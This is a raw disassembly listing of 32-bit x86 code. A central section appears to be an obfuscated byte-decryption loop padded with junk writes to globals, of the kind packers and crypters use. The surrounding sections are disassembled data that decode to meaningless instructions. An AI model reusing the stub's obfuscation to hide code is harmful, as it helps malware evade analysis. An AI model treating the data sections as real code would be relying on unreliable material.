  4038bb:	or     esp,DWORD PTR [esi]
  4038bd:	pop    esp
  4038be:	and    eax,0x8d2e233b
  4038c3:	xlat   BYTE PTR ds:[ebx]
  4038c4:	out    0x20,al
  4038c6:	outs   dx,DWORD PTR ds:[esi]
  4038c7:	push   ebp
  4038c8:	lods   al,BYTE PTR ds:[esi]
  4038c9:	fwait
  4038ca:	inc    edx
  4038cb:	push   0x6d
  4038cd:	mov    eax,ds:0x6688e5fd
  4038d2:	aas    
  4038d3:	cmc    
  4038d4:	mov    dh,0x55
  4038d6:	push   edi
  4038d7:	mov    edi,0x278e936a
  4038dc:	fiadd  WORD PTR [edx+0xa]
  4038df:	addr16 or eax,0x1abe8c90
  4038e5:	push   0xc4987e61
  4038ea:	retf   
  4038eb:	pop    es
  4038ec:	outs   dx,BYTE PTR ds:[esi]
  4038ed:	xor    al,0xc6
  4038ef:	inc    edi
  4038f0:	mov    esp,0xe51f6597
  4038f5:	outs   dx,DWORD PTR ds:[esi]
  4038f6:	not    DWORD PTR [eax]
  4038f8:	add    al,0x6d
  4038fa:	imul   ebp,DWORD PTR [ecx],0x3a
  4038fd:	jmp    0xbf39b430
  403902:	pop    edi
  403903:	mov    ecx,DWORD PTR [ebp-0x10]
  403906:	sub    DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xdbc4e32d,al
  403bc1:	js     0x403bc0
  403bc3:	xor    esp,esi
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	dec    ecx
  403bcd:	ins    BYTE PTR es:[edi],dx
  403bce:	sbb    eax,edx
  403bd0:	mov    al,ds:0x923c82f3
  403bd5:	adc    eax,0xee942a25
  403bda:	jp     0x403c5b
  403bdc:	repnz sub BYTE PTR [ebp+0x7f2d1621],0xe0
  403be4:	pusha  
  403be5:	sbb    ecx,edi
  403be7:	fisub  WORD PTR [ecx-0x42fe37df]
  403bed:	pop    esp
  403bee:	js     0x403c45
  403bf0:	jecxz  0x403bee
  403bf2:	fs sbb eax,0xa030ad22
  403bf8:	std    
  403bf9:	lea    ebx,[edi-0x49]
  403bfc:	pushf  
  403bfd:	push   ebp
  403bfe:	adc    eax,0x735254d7
  403c03:	ja     0x403bc0
  403c05:	push   edx
  403c06:	nop
  403c07:	stos   DWORD PTR es:[edi],eax
  403c08:	mov    ebp,0xaa609fed
  403c0d:	jl     0x403c13
  403c0f:	inc    edx
  403c10:	stc    
  403c11:	jecxz  0x403c0e
  403c13:	sbb    DWORD PTR [esi-0x546e2637],esi
  403c19:	xchg   DWORD PTR [ebx-0x288679b7],ecx
  403c1f:	adc    esp,DWORD PTR [eax+0x4f]
  403c22:	mov    eax,ds:0xb6951a11
  403c27:	adc    al,0x87
  403c29:	mov    ecx,0x6c63f421
  403c2e:	popf   
  403c2f:	pusha  
  403c30:	cs popf 
  403c32:	push   cs
  403c33:	bound  ebp,QWORD PTR [ecx]
  403c35:	sti    
  403c36:	sbb    eax,0xa13791a4
  403c3b:	push   0x3f
  403c3d:	outs   dx,BYTE PTR es:[esi]
  403c3f:	mov    edx,DWORD PTR [edx+eax*2-0x5c]
  403c43:	test   eax,0x34d83cf8
  403c48:	aaa    
  403c49:	ins    BYTE PTR es:[edi],dx
  403c4a:	mov    DWORD PTR [ebp+0x17],esi
  403c4d:	jle    0x403c24
  403c4f:	inc    esp
  403c50:	repnz mov ebx,0x5a7bebee
  403c56:	mov    eax,0xdbf88dc8
  403c5b:	gs mov al,0xb0
  403c5e:	push   esp
  403c5f:	cmp    DWORD PTR [eax+edi*4+0x7e2d4902],0xb319124a
  403c6a:	cli    
  403c6b:	add    ch,BYTE PTR [ecx-0x3e5c9b9b]
  403c71:	pop    eax
  403c72:	out    dx,al
  403c73:	nop
  403c74:	jp     0x403c74
  403c76:	lahf   
  403c77:	mov    esp,cr4
  403c7a:	dec    ebp
  403c7b:	inc    eax
  403c7c:	xchg   ebx,eax
  403c7d:	jnp    0x403c05
  403c7f:	ins    BYTE PTR es:[edi],dx
  403c80:	inc    BYTE PTR [esi+0x22]
  403c83:	lock push es
  403c85:	add    al,al
  403c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c88:	addr16 leave 
  403c8a:	jo     0x403c51
  403c8c:	inc    ecx
  403c8d:	pop    esi
  403c8e:	pop    esi
  403c8f:	pop    ebp
  403c90:	push   0xffffffc6
  403c92:	xor    cl,BYTE PTR [edx+0x6cf7620f]
  403c98:	xor    DWORD PTR [ecx-0x7b1fd7a0],ebp
  403c9e:	cli    
  403c9f:	cmc    
  403ca0:	cdq    
  403ca1:	push   es
  403ca2:	repnz and al,0x81
  403ca5:	jmp    0x403ca5
  403ca7:	lahf   
  403ca8:	das    
  403ca9:	or     BYTE PTR [ebp+0x35433c92],0xe4
  403cb0:	int    0xbb
  403cb2:	iret   
  403cb3:	dec    edi
  403cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cb5:	pop    ebp
  403cb6:	xchg   edx,eax
  403cb7:	sbb    dh,BYTE PTR [edx+0x7f7bc190]
  403cbd:	aad    0x95
  403cbf:	mov    cl,0xc7
  403cc1:	(bad)  [eax+0x39]
  403cc4:	mov    ch,0xf1
  403cc6:	and    DWORD PTR [edi-0x2fd66fd3],esi
  403ccc:	fimul  WORD PTR [ebp+ebp*1+0x77]
  403cd0:	mov    DWORD PTR [edi+eax*2],ebx
  403cd3:	push   edx
  403cd4:	mov    esp,0xc4a6c021
  403cd9:	scas   eax,DWORD PTR es:[edi]
  403cda:	rcr    DWORD PTR [ecx+edi*1+0x75343c85],1
  403ce1:	adc    eax,0x2d4387f
  403ce6:	out    0xea,al
  403ce8:	and    ebp,DWORD PTR ds:0xfc91922c
  403cee:	addr16 imul esi,edi,0xffffffb8
  403cf2:	lea    ecx,[eax+0x64]
  403cf5:	or     al,0x4c
  403cf7:	ss or  eax,0x27501781
  403cfd:	aas    
  403cfe:	(bad)  
  403cff:	enter  0x675,0xb4
  403d03:	int    0xdd
  403d05:	dec    ebp
  403d06:	lahf   
  403d07:	sub    eax,0xe62d5c10
  403d0c:	mov    ah,0xf
  403d0e:	mov    edi,0x430b5d91
  403d13:	xchg   edx,eax
  403d14:	xchg   BYTE PTR [esi],dl
  403d16:	or     eax,0x8fb17687
  403d1b:	jb     0x403cc7
  403d1d:	adc    eax,0xf71470c2
  403d22:	mov    edi,0x22a46834
  403d27:	test   BYTE PTR [esi],ch
  403d29:	jmp    0x403cc7
  403d2b:	sbb    esp,DWORD PTR [ebx+eax*8]
  403d2e:	ds jns 0x403d84
  403d31:	xchg   ebp,eax
  403d32:	jno    0x403d38
  403d34:	int    0x1
  403d36:	adc    al,0x99
  403d38:	dec    ebx
  403d39:	mov    DWORD PTR [ebx+eax*4-0x52ce7553],edi
  403d40:	das    
  403d41:	fsub   st(6),st
  403d43:	call   0xb031d640
  403d48:	add    bl,BYTE PTR [edx+0x6a]
  403d4b:	clc    
  403d4c:	fcomip st,st(4)
  403d4e:	jl     0x403d78
  403d50:	(bad)  [eax+0x19]
  403d53:	loopne 0x403d31
  403d55:	lea    edi,[esi+0x69b95201]
  403d5b:	add    DWORD PTR [ebx-0x45],esi
  403d5e:	sbb    BYTE PTR [ecx+0x13],ch
  403d61:	call   0x3334:0xeb201ec7
  403d68:	(bad)  
  403d69:	cli    
  403d6a:	mov    dl,0xa1
  403d6c:	or     edx,DWORD PTR [ecx+0x59]
  403d6f:	std    
  403d70:	(bad)  
  403d72:	lods   al,BYTE PTR ds:[esi]
  403d73:	and    eax,0x6c4214f0
  403d78:	xor    ebp,edi
  403d7a:	mov    al,ds:0xa9f79e28
  403d7f:	in     al,0xbd
  403d81:	int3   
  403d82:	inc    ebp
  403d83:	retf   
  403d84:	int    0xe2
  403d86:	das    
  403d87:	test   esi,ebx
  403d89:	xor    dl,dl
  403d8b:	dec    edx
  403d8c:	les    edx,FWORD PTR [edx+ebp*4]
  403d8f:	into   
  403d90:	stc    
  403d91:	out    0x4e,eax
  403d93:	fisubr DWORD PTR [esi+0x7e745a47]
  403d99:	jle    0x403d50
  403d9b:	push   ss
  403d9c:	mov    eax,ds:0x77ba623
  403da1:	mov    dh,0x75
  403da3:	daa    
  403da4:	cmp    edi,esi
  403da6:	mov    BYTE PTR [edi+edx*1-0x4193d4cc],bh
  403dad:	cld    
  403dae:	data16 fstp TBYTE PTR [ecx-0x64fe25f2]
  403db5:	xchg   ebp,eax
  403db6:	xlat   BYTE PTR ds:[ebx]
  403db7:	pop    edx
  403db8:	push   es
  403db9:	bound  edx,QWORD PTR [eax]
  403dbb:	xchg   DWORD PTR cs:[edx-0x527e155f],esp
  403dc2:	retf   
  403dc3:	sbb    BYTE PTR [edx+ebx*1+0x1a],bl
  403dc7:	gs mov gs,edi
  403dca:	js     0x403dce
  403dcc:	pop    ebx
  403dcd:	outs   dx,DWORD PTR ds:[esi]
  403dce:	add    DWORD PTR [eax+0x4],edx
  403dd1:	les    eax,FWORD PTR [eax-0x3917352b]
  403dd7:	xchg   esi,eax
  403dd8:	fwait
  403dd9:	rcl    BYTE PTR [ebp-0x24],cl
  403ddc:	adc    DWORD PTR [ecx+0x762c3288],0x228f46cf
  403de6:	mov    edi,0xc954b4f2
  403deb:	xor    al,0x95
  403ded:	mov    ebx,ss
  403def:	pop    ss
  403df0:	fucomp st(6)
  403df2:	sub    al,0x5
  403df4:	arpl   WORD PTR [ecx+0x361d1366],di
  403dfa:	adc    al,0x7f
  403dfc:	push   0x4d
  403dfe:	sub    BYTE PTR fs:[esi+0x4],cl
  403e02:	jo     0x403e69
  403e04:	add    eax,0x20963112
  403e09:	out    dx,al
  403e0a:	or     ebx,ebp
  403e0c:	loope  0x403ddf
  403e0e:	mov    ebx,0x7b48d87f
  403e13:	sub    DWORD PTR [ecx+0x505e345b],eax
  403e19:	xor    al,0x1
  403e1b:	jp     0x403e05
  403e1d:	mov    ds:0xb33ad0a3,eax
  403e22:	mov    bl,0x9c
  403e24:	fild   QWORD PTR [esi-0x3d]
  403e27:	inc    esp
  403e28:	sub    al,0xfc
  403e2a:	(bad)  
  403e2b:	loop   0x403e93
  403e2d:	in     al,0x74
  403e2f:	fcom   QWORD PTR [eax]
  403e31:	cmp    DWORD PTR [esi],ebx
  403e33:	outs   dx,BYTE PTR ds:[esi]
  403e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e35:	cwde   
  403e36:	sbb    BYTE PTR [ebp-0x47],dl
  403e39:	and    DWORD PTR [esp+esi*2],ebx
  403e3c:	adc    ah,BYTE PTR [ebx-0x16]
  403e3f:	icebp  
  403e40:	scas   eax,DWORD PTR es:[edi]
  403e41:	std    
  403e42:	mov    ah,0xa9
  403e44:	fadd   QWORD PTR [ebp-0x7afce58c]
  403e4a:	and    eax,0x9080db8d
  403e4f:	out    0x1d,eax
  403e51:	adc    BYTE PTR [eax-0x1d],0xf2
  403e55:	and    edx,ebp
  403e57:	jnp    0x403e74
  403e59:	mov    ds:0x3dd1d965,eax
  403e5e:	sti    
  403e5f:	adc    eax,0xdf97786f
  403e64:	and    cl,bl
  403e66:	cmp    eax,0x742bfbc8
  403e6b:	aaa    
  403e6c:	fwait
  403e6d:	lea    esp,[edi+0x53]
  403e70:	mov    ebx,DWORD PTR [edx+0xbd185d4]
  403e76:	fcom   st(2)
  403e78:	mov    WORD PTR [esi],ss
  403e7a:	mov    cl,0x8
  403e7c:	sbb    al,0xf5
  403e7e:	rol    BYTE PTR [edi-0x3c],1
  403e81:	jmp    0x403e2f
  403e83:	cld    
  403e84:	inc    esi
  403e85:	mov    dl,0x27
  403e87:	loopne 0x403e36
  403e89:	mov    cl,0xe
  403e8b:	outs   dx,DWORD PTR ds:[esi]
  403e8c:	scas   al,BYTE PTR es:[edi]
  403e8d:	xchg   ebx,eax
  403e8e:	cmp    al,BYTE PTR [ebx+0x8fc7269]
  403e94:	sbb    eax,0xd2a83540
  403e99:	test   eax,edx
  403e9b:	xchg   BYTE PTR [eax+0xd78c685],dh
  403ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea2:	xor    ecx,ebp
  403ea4:	cs cdq 
  403ea6:	out    0x1c,eax
  403ea8:	inc    edx
  403ea9:	sbb    eax,0x7f2ef52f
  403eae:	dec    ecx
  403eaf:	mov    gs,edi
  403eb1:	adc    BYTE PTR [edi],dl
  403eb3:	or     BYTE PTR [esi+eiz*2+0x33c608e5],0x75
  403ebb:	ja     0x403e80
  403ebd:	(bad)  
  403ebe:	mov    BYTE PTR [ecx],bh
  403ec0:	inc    ebx
  403ec1:	test   BYTE PTR [ecx-0x43],0x2f
  403ec5:	add    BYTE PTR [esi-0xab00d95],dh
  403ecb:	addr16 cmp ebp,0x9c7e19cb
  403ed2:	fdiv   QWORD PTR [esi]
  403ed4:	mov    WORD PTR [esp+eiz*8-0x6],ss
  403ed8:	sbb    al,0x8d
  403eda:	add    al,0xdd
  403edc:	pop    es
  403edd:	ja     0x403ea8
  403edf:	push   cs
  403ee0:	jne    0x403f2c
  403ee2:	pop    edi
  403ee3:	int    0x81
  403ee5:	(bad)
  403ee9:	dec    esi
  403eea:	sahf   
  403eeb:	mov    ebp,0x501a9ffe
  403ef0:	jle    0x403f06
  403ef2:	or     eax,esp
  403ef4:	(bad)  
  403ef5:	enter  0x1ea9,0x4f
  403ef9:	je     0x403ece
  403efb:	test   eax,0x3f3aa65d
  403f00:	data16 test BYTE PTR [eax+0xb],0xb3
  403f05:	fcomp  DWORD PTR [edx-0x10]
  403f08:	push   esp
  403f09:	mov    dh,0x28
  403f0b:	call   0x4a5622c3
  403f10:	xor    ah,BYTE PTR [eax+ebp*4+0x2dd57037]
  403f17:	or     DWORD PTR [edi+0x23],ecx
  403f1a:	mov    ebp,0x1fff4f11
  403f1f:	bound  esp,QWORD PTR [edx-0x3a]
  403f22:	jnp    0x403f4b
  403f24:	add    al,0xaa
  403f26:	fstp   DWORD PTR [ecx+0x55]
  403f29:	sub    BYTE PTR [esi+eiz*2-0x457537ae],0x6f
  403f31:	pop    ds
  403f32:	js     0x403f0f
  403f34:	xchg   esi,eax
  403f35:	in     al,dx
  403f36:	mov    dl,0xfd
  403f38:	cmp    eax,0x6f6010c9
  403f3d:	in     eax,0x5d
  403f3f:	cld    
  403f40:	cmp    eax,0x2e239358
  403f45:	xchg   esi,eax
  403f46:	sub    ah,BYTE PTR [eax-0x3c]
  403f49:	or     DWORD PTR [eax],edi
  403f4b:	mov    bh,BYTE PTR [edi+0x7d3a2c5]
  403f51:	repz std 
  403f53:	push   ds
  403f54:	inc    eax
  403f55:	xchg   BYTE PTR [edi-0x18],ah
  403f58:	pop    esi
  403f59:	pop    esi
  403f5a:	sub    cl,ch
  403f5c:	retf   
  403f5d:	sbb    DWORD PTR [edi],0x7b
  403f60:	inc    ebx
  403f61:	add    DWORD PTR [edi-0x5f58de02],ecx
  403f67:	sbb    ebx,esp
  403f69:	fwait
  403f6a:	inc    edx
  403f6b:	add    DWORD PTR [ebx],ebp
  403f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f6e:	out    dx,eax
  403f6f:	ror    DWORD PTR [esi],1
  403f71:	dec    edi
  403f72:	cs out dx,al
  403f74:	mov    ebp,0xffc6f42b
  403f79:	js     0x403fdf
  403f7b:	lods   eax,DWORD PTR ds:[esi]
  403f7c:	dec    ebp
  403f7d:	inc    BYTE PTR [edx-0x5f]
  403f80:	mov    esp,0xa49a29c0
  403f85:	mov    DWORD PTR [esp+esi*8+0xd9f7799],esi
  403f8c:	sbb    ecx,DWORD PTR [eax+eiz*2-0x19]
  403f90:	xchg   BYTE PTR [eax+edx*1-0x5c4a7b3f],dl
  403f97:	dec    edx
  403f98:	retf   
  403f99:	dec    edx
  403f9a:	sbb    DWORD PTR [ebx+0x3c4fe113],esi
  403fa0:	loop   0x40401b
  403fa2:	or     BYTE PTR [ebx],0xee
  403fa5:	setl   BYTE PTR [eax-0x54]
  403fa9:	aam    0x7
  403fab:	test   eax,0xc23ef234
  403fb0:	repnz lds esi,FWORD PTR cs:[eax+0x2d5f4997]
  403fb8:	sbb    al,0xee
  403fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fbb:	leave  
  403fbc:	push   esp
  403fbd:	mov    dh,0x66
  403fbf:	inc    ebx
  403fc0:	mov    al,0x8e
  403fc2:	lods   eax,DWORD PTR ds:[esi]
  403fc3:	sbb    esp,DWORD PTR [ecx+ebp*4]
  403fc6:	pop    ecx
  403fc7:	out    0xcd,al
  403fc9:	sar    BYTE PTR [esi+esi*1],cl
  403fcc:	in     al,0x1f
  403fce:	call   0x92e38830
  403fd3:	pop    ebx
  403fd4:	xor    ebp,DWORD PTR [edx+0x36]
  403fd7:	idiv   esp
  403fd9:	stos   DWORD PTR es:[edi],eax
  403fda:	jmp    0x74b0:0xb24925d3
  403fe1:	mov    edx,0x41c0ddd
  403fe6:	sar    BYTE PTR [eax],1
  403fe8:	xor    al,0xbe
  403fea:	push   ecx
  403feb:	repz mov ds:0xaa45377e,al
  403ff1:	push   ss
  403ff2:	loope  0x40400a
  403ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ff5:	sahf   
  403ff6:	in     al,dx
  403ff7:	pop    es
  403ff8:	retf   0xb1a
  403ffb:	or     ecx,DWORD PTR [esi]
  403ffd:	rcr    DWORD PTR [edi-0x4ac0a06a],0xa5
  404004:	xchg   BYTE PTR [edi+eiz*8-0x2634b88d],cl
  40400b:	ss inc eax
  40400d:	push   0xadf0d323
  404012:	sbb    ecx,esp
  404014:	fstp   QWORD PTR [edi-0x5f]
  404017:	icebp  
  404018:	idiv   BYTE PTR [esi+ecx*8]
  40401b:	sbb    BYTE PTR [edi],0xf8
  40401e:	test   eax,0x4d0aa843
  404023:	enter  0x9584,0x18
  404027:	mov    bh,0x7b
  404029:	dec    edi
  40402a:	adc    al,BYTE PTR [ecx+0x31]
  40402d:	paddw  mm3,QWORD PTR [edx+ebx*1-0x50]
  404032:	fistp  DWORD PTR [ecx]
  404034:	std    
  404035:	jecxz  0x404072
  404037:	sbb    ch,bh
  404039:	test   DWORD PTR [ecx-0x1],ecx
  40403c:	pop    edi
  40403d:	mov    esp,0x5a674703
  404042:	jmp    0x38d9:0x85d0fa0c
  404049:	icebp  
  40404a:	mov    ebx,0xf3ddf60b
  40404f:	aaa    
  404050:	and    eax,0x31e3f97c
  404055:	ins    BYTE PTR es:[edi],dx
  404056:	or     BYTE PTR [ebx-0x73],bh
  404059:	push   ds
  40405a:	xchg   edx,eax
  40405b:	(bad)  
  40405c:	arpl   WORD PTR [edx-0xc],cx
  40405f:	cmp    BYTE PTR [ebx],0xf9
  404062:	adc    BYTE PTR [ebx+0x28342397],0x33
  404069:	fadd   DWORD PTR [edi+0x1b]
  40406c:	out    dx,eax
  40406d:	jnp    0x4040db
  40406f:	mov    ebx,0xe3fec3f0
  404074:	jecxz  0x4040f3
  404076:	outs   dx,BYTE PTR ds:[esi]
  404077:	(bad)  [esi+ebx*1-0x41db7e77]
  40407e:	iret   
  40407f:	popa   
  404080:	out    0xc6,eax
  404082:	mov    WORD PTR [ebp+0x6830dbbb],?
  404088:	dec    esi
  404089:	outs   dx,BYTE PTR ds:[esi]
  40408a:	adc    ecx,DWORD PTR [edx+0xe]
  40408d:	clc    
  40408e:	cmp    al,0x88
  404090:	push   0xffffffb5
  404092:	stc    
  404093:	or     esp,DWORD PTR [edi]
  404095:	mov    ds:0x565070e1,eax
  40409a:	(bad)  
  40409b:	mov    ch,0x3e
  40409d:	push   esi
  40409e:	jmp    0x4cc1:0x4992fb9a
  4040a5:	rcr    BYTE PTR [ebx+ebp*1+0x13],cl
  4040a9:	jmp    0x381f7013
  4040ae:	push   es
  4040af:	loop   0x4040c0
  4040b1:	sbb    eax,ebp
  4040b3:	pop    ebx
  4040b4:	push   0xf2962f3
  4040b9:	(bad)  
  4040ba:	mov    esi,0xdecf59f7
  4040bf:	fst    DWORD PTR [eax+esi*1]
  4040c2:	js     0x4040cc
  4040c4:	push   cs
  4040c5:	ss fwait
  4040c7:	xchg   ebx,eax
  4040c8:	pop    edi
  4040c9:	outs   dx,DWORD PTR ds:[esi]
  4040ca:	lahf   
  4040cb:	mov    dh,0x4c
  4040cd:	xchg   ebp,eax
  4040ce:	cli    
  4040cf:	jb     0x40411f
  4040d1:	pop    esi
  4040d2:	jmp    0xef4b:0x9541035d
  4040d9:	stos   BYTE PTR es:[edi],al
  4040da:	add    BYTE PTR [eax-0x73],bh
  4040dd:	into   
  4040de:	mov    bl,0x19
  4040e0:	sbb    DWORD PTR [ecx+esi*1-0x48829982],ebx
  4040e7:	dec    esp
  4040e8:	add    ah,ch
  4040ea:	xlat   BYTE PTR ds:[ebx]
  4040eb:	xor    dh,bl
  4040ed:	mov    BYTE PTR [ecx+0x3f],bl
  4040f0:	cmp    BYTE PTR [eax],ch
  4040f2:	mov    al,0xc0
  4040f4:	sub    cl,bh
  4040f6:	mov    ebp,DWORD PTR [ecx-0x61]
  4040f9:	inc    edi
  4040fa:	inc    ebx
  4040fb:	jne    0x4040f1
  4040fd:	mov    al,BYTE PTR [eax+0x516e457f]
  404103:	lea    ebx,[ecx+0x7e]
  404106:	sub    DWORD PTR [esp+edx*4+0x2bf7d70b],ecx
  40410d:	or     BYTE PTR [ebp-0x6d],al
  404110:	pop    edx
  404111:	or     DWORD PTR [esi+0x7ebaeb64],0xc7466ff4
  40411b:	lods   al,BYTE PTR ds:[esi]
  40411c:	jmp    0x404144
  40411e:	jns    0x404136
  404120:	pop    ebx
  404121:	or     al,0x77
  404123:	sbb    esp,DWORD PTR [ebx]
  404125:	out    dx,eax
  404126:	jge    0x404124
  404128:	add    eax,0xea96b961
  40412d:	cmp    DWORD PTR [edx],0x23b9b91c
  404133:	sub    al,0x71
  404135:	inc    esp
  404136:	fld    st(0)
  404138:	cmp    al,0xe5
  40413a:	popa   
  40413b:	cli    
  40413c:	fs (bad) 
  40413e:	(bad)  
  40413f:	jle    0x404145
  404141:	test   al,0x8c
  404143:	repz xor BYTE PTR es:[ecx+0x49d16557],0x4c
  40414c:	add    DWORD PTR [ecx+0x18],esp
  40414f:	std    
  404150:	jbe    0x404152
  404152:	pop    ebx
  404153:	xchg   ebp,eax
  404154:	cld    
  404155:	adc    DWORD PTR [esi+0x27],ebx
  404158:	fmul   QWORD PTR [ecx+0x79]
  40415b:	jb     0x40419a
  40415d:	adc    al,0xea
  40415f:	sub    eax,0x1e2060c
  404164:	and    eax,0xc5a9862a
  404169:	pop    ebx
  40416a:	mov    al,ds:0xfa155919
  40416f:	and    al,0x2e
  404171:	push   0x30
  404173:	lea    edi,[edx+0x6981282]
  404179:	test   BYTE PTR [ebx+0x28],ch
  40417c:	xor    DWORD PTR [ecx+edi*1],ecx
  40417f:	sbb    ah,dl
  404181:	mov    eax,0x6a61fc9f
  404186:	loope  0x404173
  404188:	adc    DWORD PTR [esi+edx*8+0x397f8f8e],edx
  40418f:	ja     0x404122
